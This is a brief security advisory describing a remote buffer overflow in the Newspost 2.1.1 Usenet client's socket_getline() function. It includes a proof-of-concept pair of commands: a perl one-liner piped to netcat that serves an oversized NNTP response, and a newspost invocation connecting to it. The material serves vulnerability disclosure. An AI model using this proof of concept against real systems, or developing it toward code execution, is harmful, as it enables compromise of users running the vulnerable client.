Newspost is prone to a remote buffer overflow vulnerability due to an unbounded memory copy operation.

The problem occurs in the 'socket_getline()' function of 'socket.c' when the vulnerable client handles NNTP server responses.

Successful exploitation of this issue could potentially lead to arbitrary code execution.

This issue was reported to affect Newspost 2.1.1 and prior, however, other versions may be vulnerable.

Create a server:
perl -e 'print "A" x 1024;print "BBBBCCCCDDDDEEEE"'| nc -v -l -p 119

Connect to it:
newspost -s test -i localhost -f me@me.nl -n news.news /etc/hosts
